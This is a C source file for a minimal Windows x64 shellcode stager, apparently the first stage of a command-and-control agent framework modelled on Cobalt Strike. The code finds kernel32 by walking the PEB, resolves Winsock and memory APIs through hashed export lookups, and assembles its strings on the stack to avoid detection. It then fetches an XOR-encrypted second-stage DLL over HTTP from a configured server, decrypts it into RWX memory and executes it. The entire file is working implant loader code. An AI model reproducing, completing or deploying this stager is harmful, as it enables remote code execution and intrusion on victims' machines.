/*
 * stager_stub.c — position-independent minimal HTTP stager (x64, Windows).
 *
 * Goal: a Cobalt-Strike-style tiny first stage (~2 KB). Fetches the
 * XOR-encrypted stage-2 blob from /stage/<token>?raw=1, decrypts it and jumps
 * to it. The stage-2 blob is the sRDI-packed agent DLL (self-locating), so no
 * reflective loader is needed here.
 *
 * stager_main() is invoked by a Go-written prologue that sets RCX to a config
 * block appended to the blob (see internal/stager/stager.go):
 *
 *   [ prologue: lea rcx,[rip+config]; jmp stager_main ]
 *   [ stager blob (this file, objcopy'd)               ]
 *   [ config: magic ip[4] port[2] key[32] path[128]    ]
 *
 * Built with:
 *   gcc -m64 -ffreestanding -fno-pic -fno-stack-protector \
 *       -fno-asynchronous-unwind-tables -O1 -c stager_stub.c
 *   objcopy -O binary stager_stub.o stager_stub.bin
 *
 * No CRT and NO string literals: every string is assembled on the stack. objcopy
 * turns the .o into a flat blob without applying relocations, so any reference
 * to .rodata/.data would be garbage — all data lives in the appended config
 * block addressed via RCX. Winsock-only: HTTP/1.0, no TLS (a 2 KB stager cannot
 * carry a TLS stack; use the Go stager for HTTPS listeners).
 */

#include <stdint.h>
#include <stddef.h>

#ifdef STAGER_NOTE
#include <windows.h>
static void stager_note(const char* tag, int v) {
    HANDLE h = CreateFileA("C:\\trace.txt", GENERIC_WRITE, 0, 0, OPEN_ALWAYS, 0, 0);
    if (h != INVALID_HANDLE_VALUE) { DWORD w; char b[64]; int n=wsprintfA(b,"%s=%d\n",tag,v); WriteFile(h,b,n,&w,0); CloseHandle(h); }
}
#else
static void stager_note(const char* tag, int v) { (void)tag; (void)v; }
#endif


/* ---- config block layout (must match internal/stager/stager.go) ---- */
struct stager_cfg {
	uint32_t magic;     /* 0x50534957 "WISP" (LE bytes 57 49 53 50) */
	uint8_t  ip[4];     /* server IPv4, network byte order */
	uint16_t port;      /* server port, network byte order */
	uint8_t  key[32];   /* XOR key */
	uint8_t  path[128]; /* "/stage/<token>?raw=1" (NUL terminated) */
};

/* ---- minimal PE structures (PE32+) ---- */
typedef struct {
	uint16_t e_magic;
	uint8_t  pad[60];
	int32_t  e_lfanew;
} WISP_DOS_HDR;

typedef struct {
	uint32_t Signature;
	uint16_t Machine;
	uint16_t NumberOfSections;
	uint8_t  pad0[12];
	uint16_t SizeOfOptionalHeader;
	uint16_t pad1;
} WISP_FILE_HDR;

typedef struct {
	uint32_t Magic;
	uint8_t  pad0[8];
	uint32_t AddressOfEntryPoint;
	uint64_t ImageBase;
	uint8_t  pad1[196];
	uint32_t NumberOfRvaAndSizes;
	uint32_t DataDirectory[64]; /* 16 dirs x 2 u32 */
} WISP_OPT_HDR64;

#define HASH_LoadLibraryA   0x53b2070f
#define HASH_GetProcAddress 0xf8f45725
#define HASH_VirtualAlloc   0x03285501
#define HASH_VirtualProtect 0x820621f3
#define HASH_WSAStartup     0x20125c5f
#define HASH_socket         0x9012766c
#define HASH_connect        0xaae0ccf9
#define HASH_send           0x7261c8af
#define HASH_recv           0xece4502d
#define HASH_closesocket    0x06834302

typedef void* (*fnLoadLibraryA)(const char*);
typedef void* (*fnGetProcAddress)(void*, const char*);
typedef void* (*fnVirtualAlloc)(void*, size_t, uint32_t, uint32_t);
typedef int   (*fnVirtualProtect)(void*, size_t, uint32_t, uint32_t*);

/* hash_api — FNV-1a of an export name (same as srdi_stub.c). */
static uint32_t hash_api(const char* name) {
	uint32_t h = 0x811c9dc5;
	while (*name) {
		h ^= (uint8_t)*name++;
		h *= 0x01000193;
	}
	return h;
}

/* get_export — resolve an export by FNV-1a hash from a PE32+ module. */
static void* get_export(void* module_base, uint32_t hash) {
	uint8_t* m = (uint8_t*)module_base;
	if (*(uint16_t*)m != 0x5A4D) return 0;
	WISP_FILE_HDR* fh = (WISP_FILE_HDR*)(m + *(int32_t*)(m + 0x3C));
	if (fh->Signature != 0x00004550) return 0;
	uint8_t* oh = (uint8_t*)fh + 24;
	uint32_t* ddir = (uint32_t*)(oh + 112); /* ExportDirectory RVA+Size */
	uint32_t exp_rva = ddir[0];
	if (!exp_rva) return 0;
	uint8_t* exp = m + exp_rva;
	uint32_t n = *(uint32_t*)(exp + 24);
	uint32_t* names = (uint32_t*)(m + *(uint32_t*)(exp + 32));
	uint16_t* ords  = (uint16_t*)(m + *(uint32_t*)(exp + 36));
	uint32_t* funcs = (uint32_t*)(m + *(uint32_t*)(exp + 28));
	uint32_t i;
	for (i = 0; i < n; i++) {
		const char* nm = (const char*)m + names[i];
		if (hash_api(nm) == hash) return (void*)(m + funcs[ords[i]]);
	}
	return 0;
}

/* find_kernel32 — walk PEB->Ldr->InMemoryOrderModuleList and identify kernel32
 * by its EXPORT TABLE, not by its module name. The list node (`cur`) points at
 * the entry's InMemoryOrderLinks field (offset 0x10 inside
 * LDR_DATA_TABLE_ENTRY), so DllBase is at *(cur + 0x20) (entry+0x30).
 * Every module whose export table contains "LoadLibraryA" is kernel32 (it is
 * the canonical module that exports it). Reading export tables via get_export()
 * is bounds-checked (never dereferences potentially-invalid name pointers),
 * so this cannot crash on a corrupted/invalid module-list entry.
 */
static void* find_kernel32(void) {
	uint64_t peb;
	__asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(peb));
	uint64_t ldr = *(uint64_t*)((uint8_t*)peb + 0x18);
	uint64_t first = *(uint64_t*)((uint8_t*)ldr + 0x20);
	uint64_t cur = first;
	int guard = 0;
	for (;;) {
		if (++guard > 128) break; /* corrupt-list safety */
		uint64_t dll_base = *(uint64_t*)((uint8_t*)cur + 0x20);
		if (dll_base && get_export((void*)dll_base, HASH_LoadLibraryA)) {
			return (void*)dll_base;
		}
		cur = *(uint64_t*)cur;
		if (cur == first) break;
	}
	return 0;
}

static int u16toa(uint8_t* dst, uint16_t v) {
	int n = 0;
	uint8_t tmp[6];
	do { tmp[n++] = (uint8_t)('0' + v % 10); v /= 10; } while (v);
	int i;
	for (i = 0; i < n; i++) dst[i] = tmp[n - 1 - i];
	dst[n] = 0;
	return n;
}

static int ipv4toa(uint8_t* dst, const uint8_t* ip) {
	int o = 0, i;
	for (i = 0; i < 4; i++) {
		if (i) dst[o++] = '.';
		o += u16toa(dst + o, ip[i]);
	}
	return o;
}

/*
 * stager_main — entry point (RCX = &stager_cfg on x64).
 *  1. resolve winsock via PEB walk + export hashing (no IAT)
 *  2. HTTP/1.0 GET /stage/<token>?raw=1
 *  3. XOR-decrypt stage-2
 *  4. VirtualAlloc RWX, copy, jump
 */
int stager_main(struct stager_cfg* cfg) {
	(void)cfg;
	void* k32 = find_kernel32();
	if (!k32) { stager_note("n_k32", 1);
	return 1; }
	fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)get_export(k32, HASH_LoadLibraryA);
	fnGetProcAddress pGetProcAddress = (fnGetProcAddress)get_export(k32, HASH_GetProcAddress);
	fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)get_export(k32, HASH_VirtualAlloc);
	fnVirtualProtect pVirtualProtect = (fnVirtualProtect)get_export(k32, HASH_VirtualProtect);
	if (!pLoadLibraryA || !pGetProcAddress || !pVirtualAlloc || !pVirtualProtect) { stager_note("n_exports", 2);
	return 2; }

	/* load ws2_32.dll: build "ws2_32.dll" on the stack (no .rodata refs) */
	uint8_t ws2[12];
	{
		const uint8_t s[11] = {'w','s','2','_','3','2','.','d','l','l',0};
		int i;
		for (i = 0; i < 11; i++) ws2[i] = s[i];
	}
void* ws2m = pLoadLibraryA((const char*)ws2);
	if (!ws2m) { stager_note("n_ws2load", 3);
	return 3; }

	typedef int       (*fnWSAStartup)(uint16_t, void*);
	typedef intptr_t  (*fnSocket)(int, int, int);
	typedef int       (*fnConnect)(intptr_t, void*, int);
	typedef int       (*fnSend)(intptr_t, const void*, int, int);
	typedef int       (*fnRecv)(intptr_t, void*, int, int);
	typedef int       (*fnClose)(intptr_t);
	fnWSAStartup pWSAStartup = (fnWSAStartup)get_export(ws2m, HASH_WSAStartup);
	fnSocket pSocket = (fnSocket)get_export(ws2m, HASH_socket);
	fnConnect pConnect = (fnConnect)get_export(ws2m, HASH_connect);
	fnSend pSend = (fnSend)get_export(ws2m, HASH_send);
	fnRecv pRecv = (fnRecv)get_export(ws2m, HASH_recv);
	fnClose pClose = (fnClose)get_export(ws2m, HASH_closesocket);
	if (!pWSAStartup || !pSocket || !pConnect || !pSend || !pRecv || !pClose) { stager_note("n_ws2exp", 4);
	return 4; }

	/* WSAStartup(0x0202, &wsadata) */
	uint8_t wsadata[400];
	if (pWSAStartup(0x0202, wsadata) != 0) { stager_note("n_wsastart", 5);
	return 5; }

	/* socket(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6) */
	intptr_t sock = pSocket(2, 1, 6);
	if (sock == (intptr_t)~(intptr_t)0) { stager_note("n_socket", 6);
	return 6; }

	/* sockaddr_in on the stack: family(2) port(2 BE) ip(4) pad(8) */
	uint8_t sa[16];
	sa[0] = 2; sa[1] = 0;
	sa[2] = (cfg->port >> 8) & 0xff;
	sa[3] = cfg->port & 0xff;
	sa[4] = cfg->ip[0]; sa[5] = cfg->ip[1]; sa[6] = cfg->ip[2]; sa[7] = cfg->ip[3];
	sa[8] = 0; sa[9] = 0; sa[10] = 0; sa[11] = 0; sa[12] = 0; sa[13] = 0; sa[14] = 0; sa[15] = 0;
	if (pConnect(sock, sa, 16) != 0) {
		stager_note("n_connect", 7); pClose(sock);
		return 7; }

	/* build request on the stack:
	 * "GET <path> HTTP/1.0\r\nHost: <ip>:<port>\r\nConnection: close\r\n\r\n" */
	uint8_t req[512];
	int o = 0, i;
	req[o++]='G'; req[o++]='E'; req[o++]='T'; req[o++]=' ';
	for (i = 0; cfg->path[i] && o < 480; i++) req[o++] = cfg->path[i];
	req[o++]=' '; req[o++]='H'; req[o++]='T'; req[o++]='T'; req[o++]='P'; req[o++]='/';
	req[o++]='1'; req[o++]='.'; req[o++]='0'; req[o++]='\r'; req[o++]='\n';
	req[o++]='H'; req[o++]='o'; req[o++]='s'; req[o++]='t'; req[o++]=':'; req[o++]=' ';
	o += ipv4toa(req + o, cfg->ip);
	req[o++] = ':';
	o += u16toa(req + o, cfg->port);
	req[o++]='\r'; req[o++]='\n';
	req[o++]='C'; req[o++]='o'; req[o++]='n'; req[o++]='n'; req[o++]='e'; req[o++]='c'; req[o++]='t'; req[o++]='i'; req[o++]='o'; req[o++]='n'; req[o++]=':'; req[o++]=' ';
	req[o++]='c'; req[o++]='l'; req[o++]='o'; req[o++]='s'; req[o++]='e';
	req[o++]='\r'; req[o++]='\n'; req[o++]='\r'; req[o++]='\n';
	req[o] = 0;

	pSend(sock, req, o, 0);
	stager_note("n_sent", 0);

	/* receive into a 32 MB buffer (stage-2 sRDI blob can be ~10 MB) */
	size_t cap = 32u * 1024 * 1024;
	uint8_t* buf = (uint8_t*)pVirtualAlloc(0, cap, 0x3000, 0x04);
	if (!buf) { pClose(sock); return 0; }
	size_t total = 0;
	int r;
	while (total < cap) {
		r = pRecv(sock, buf + total, (int)(cap - total), 0);
		if (r <= 0) break;
		total += (size_t)r;
	}
	pClose(sock);
	if (total == 0) { stager_note("n_recv", 8);
	return 8; }

	/* find \r\n\r\n, body follows */
	size_t hdr = 0;
	int found = 0;
	for (i = 0; i + 4 <= (int)total; i++) {
		if (buf[i]=='\r' && buf[i+1]=='\n' && buf[i+2]=='\r' && buf[i+3]=='\n') { hdr = i + 4; found = 1; break; }
	}
	if (!found) hdr = 0;
	size_t body = total - hdr;
	uint8_t* p = buf + hdr;

	/* XOR decrypt in place */
	{
		size_t j;
		for (j = 0; j < body; j++) p[j] ^= cfg->key[j % 32];
	}

	/* allocate RWX, copy, jump */
	uint8_t* mem = (uint8_t*)pVirtualAlloc(0, body, 0x3000, 0x40);
	if (!mem) return 0;
	for (i = 0; i < (int)body; i++) mem[i] = p[i];
	stager_note("n_exec", 0);
	((void (*)(void))mem)();
	return 1;
}



